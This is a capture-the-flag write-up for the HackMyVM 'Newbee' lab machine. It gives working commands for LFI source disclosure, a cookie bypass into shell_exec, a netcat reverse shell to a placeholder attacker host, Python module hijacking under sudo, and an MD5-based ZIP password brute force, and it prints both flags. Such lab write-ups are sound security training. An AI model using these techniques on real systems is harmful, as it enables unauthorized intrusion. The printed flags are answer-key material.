# Newbee-HMV: [Newbee](https://hackmyvm.eu/machines/machine.php?vm=Newbee)

> **Summary:** Web enum → directory & parameter fuzzing → LFI via php://filter → secret.php source disclosure → cookie auth bypass → command execution → reverse shell (www-data) → sudo Python module hijacking (random.py) → debian → ZIP (md5(key)) → Depix stego → root

---

## Overview

**Goal:** Gain initial foothold via web exploitation, escalate privileges to user and root, and retrieve both flags on the *Newbee* machine.

**Attack path (high level):**
1. Network and web enumeration.
2. Directory discovery and parameter fuzzing on index.php.
3. Local File Inclusion (LFI) via php://filter to disclose secret.php source code.
4. Authentication bypass using a forged AreYouAdmin cookie.
5. Remote command execution via secret.php.
6. Reverse shell as www-data.
7. Privilege escalation via sudo abuse and Python module hijacking (random.py) to debian.
8. Enumeration of debian home directory and discovery of ZIP-based secret.
9. ZIP password recovery using md5(key).
10. Steganographic analysis with Depix to recover a hidden phrase.
11. Root access via password reuse and flag retrieval.

---

## 1) Enumeration

Initial network scan with `nmap` reveals open SSH and HTTP services:

```zsh
nmap -p- -sC -sV newbee.hmv
```

Key output:

```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

---

## 2) Web Enumeration and Parameter Fuzzing

Using `feroxbuster` to discover files and extensions on the web server:

```zsh
feroxbuster -u http://newbee.hmv/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,txt
```

This reveals a `secret.php` file.

Parameter fuzzing with `wfuzz` to find parameters accepted by `index.php`:

```zsh
wfuzz -t 500 -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --hh BBB "http://newbee.hmv/index.php?FUZZ{TEST}=id"
```

Discovery result:

```
000000937: 200 376 L 1270 W 18863 Ch "hack"
```

---

## 3) LFI & Source Disclosure via php://filter

Using the `php://filter` wrapper to base64-encode and retrieve the source code of `secret.php` through the `hack` parameter:

```zsh
curl "http://newbee.hmv/index.php?hack=php://filter/convert.base64-encode/resource=secret.php" | base64 -d > secret.php
```
- `hack` is the LFI parameter.
- `php://filter` is used for source disclosure.

### secret.php Source Code Analysis (Partally)

```php
if (isset($_COOKIE['AreYouAdmin']) && $_COOKIE['AreYouAdmin'] === 'Yes') {
    if (isset($_GET['command'])) {
        $command = $_GET['command'];
        $output = shell_exec($command);
        echo '<div>\> ' . htmlspecialchars($command) . '</div>';
        echo '<div>' . nl2br(htmlspecialchars($output)) . '</div>';
    }
} else {
    echo '<div>No permission to execute commands, lacking admin permission.</div>';
}
```


- Cookie `AreYouAdmin=Yes` enables command execution.
- The command is passed via the `command` GET parameter.

---

## 4) Cookie Authentication Bypass and Command Execution

By setting the cookie `AreYouAdmin=Yes`, arbitrary commands can be executed on the server.

Example command execution to check user identity:

```zsh
curl -H "Cookie: AreYouAdmin=Yes" "http://newbee.hmv/index.php?hack=secret.php&command=id"
```

Output confirms command execution as the web server user.

---

## 5) Reverse Shell as www-data

Spawn a reverse shell by executing a netcat command via the vulnerable `command` parameter:

```zsh
curl -H "Cookie: AreYouAdmin=Yes" "http://newbee.hmv/index.php?hack=secret.php&command=nc -e /bin/bash attacker_ip attacker_port"
```

This connects back to the attacker's listener, providing a shell as `www-data`.

---

## 6) Sudo Privilege Check and Abuse

Check sudo privileges for `www-data`:

```zsh
sudo -l
```

Output:

```
User www-data may run the following commands on newbee:
    (debian) NOPASSWD: /usr/bin/python3 /var/www/html/vuln.py
```

This allows running `vuln.py` as user `debian` without a password.

### Python Module Hijacking (random.py)

The vulnerable script `vuln.py` imports the standard Python `random` module. However, Python searches for modules starting from the **current working directory first** before falling back to the standard library. This behavior allows an attacker to hijack the module import by placing a malicious `random.py` file in the directory where `vuln.py` is executed.

By creating a malicious `random.py` in the same directory, the attacker can execute arbitrary code with the privileges of the `debian` user when running `vuln.py` via sudo.

Exploitation steps:

Create the malicious `random.py`:

```zsh
cat << 'EOF' > random.py
import os
os.system("/bin/bash")
EOF
```

Run the vulnerable script as `debian` via sudo:

```zsh
sudo -u debian /usr/bin/python3 /var/www/html/vuln.py
```

Result:

- The malicious `random.py` is loaded instead of the standard library module.
- A shell is spawned as user `debian`.

---

## 7) User Enumeration and Credential Discovery

After successfully exploiting the Python module hijacking vulnerability, a shell is obtained with `debian` user privileges. The next step involves enumerating the user's home directory to gather information and credentials relevant for further exploitation.

Execute the following commands to list and read files in `/home/debian`:

```zsh
cd /home/debian
ls
cat user.txt note.txt config.php
```

Output:

```
config.php  note.txt  user.txt
ed2b1f468c5f915f3f1cf75d7068baae
Damn it, I forgot my database password. I heard that Debian is currently building a message board, maybe he can help me
<?php
$servername = "localhost";
$username = "root";
$password = "
```

- `user.txt` contains the user flag hash.
- `note.txt` provides a hint about a missing database password and suggests that the Debian user might be developing a message board, implying that further investigation is needed.
- `config.php` appears to be an incomplete database configuration file with the password missing or truncated.

Further inspection of the hidden `.secret` directory reveals additional clues:

```zsh
ls -la /home/debian/.secret
cat /home/debian/.secret/hint.txt
```

The hint indicates that the ZIP archive password is generated as an MD5 hash of a key. Importantly, this key is stored within the MySQL database and must be recovered indirectly through further enumeration and exploitation.

---

## 8) ZIP File Download and Password Recovery

Within the `.secret` directory, a ZIP archive named `password.zip` is found. To analyze this file, it must be transferred to the attacker's machine. This can be accomplished by hosting a simple HTTP server from the compromised machine:

```zsh
python3 -m http.server
```

From the attacker's machine, download the ZIP archive:

```zsh
wget http://newbee.hmv:8000/password.zip
```

Initial attempts to unzip the archive using standard tools like `unzip` often result in false positives or incorrect password prompts due to the archive's encryption method. Therefore, to accurately verify the password, `7z` is used with the `t` (test) option, which reliably validates the password without extracting files.

To recover the password, a wordlist is processed by hashing each candidate word using MD5 and testing it against the archive:

```zsh
while read -r word; do
  pass=$(printf "%s" "$word" | md5sum | awk '{print $1}')
  if 7z t -p"$pass" password.zip >/dev/null 2>&1; then
    echo "[+] VALID PASSWORD FOUND"
    echo "word: $word"
    echo "md5 : $pass"
    break
  fi
done < ../rockyou.txt
```

Once the correct password is identified, `7z` successfully extracts the file `password.png` from the archive.

---

## 9) Steganography (Depix)

The extracted image `password.png` is heavily pixelated, composed of 5×5 pixel blocks. Due to this pixelation, conventional steganography tools fail to reveal any hidden data or messages.

A quick manual attempt to make the pixel blocks readable is to downscale the image by the block size (5×5) and preview it in the terminal.

```zsh
convert password.png -scale 20% small.png
chafa small.png
```

The pixelation pattern suggests that the image was intentionally obfuscated 


```zsh
python3 depix.py -p password.png -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png -o out.png
```

To preview the reconstructed output image in the terminal, use:

```zsh
chafa out.png
```

Depix successfully reconstructs the image, revealing a readable but slightly blurred phrase, which is expected due to the nature of the pixelation and reconstruction process.

Recovered phrase:

```
hello from the other side
```

---

## 10) Root Access

Using the recovered phrase from the steganography step, the phrase is reused as the root password, concatenated without spaces:

```zsh
debian@Newbee:~/.secret$ su root 
Password: hellofromtheotherside
root@Newbee:/home/debian/.secret# cd
root@Newbee:~# ls
root.txt
root@Newbee:~# cat root.txt 
c18b3eff03996f3a203f63733be03d15
root@Newbee:~# 
```

This grants root access, allowing retrieval of the root flag.

---

## 11) Flags

- **User flag:** `ed2b1f468c5f915f3f1cf75d7068baae`
- **Root flag:** `c18b3eff03996f3a203f63733be03d15`
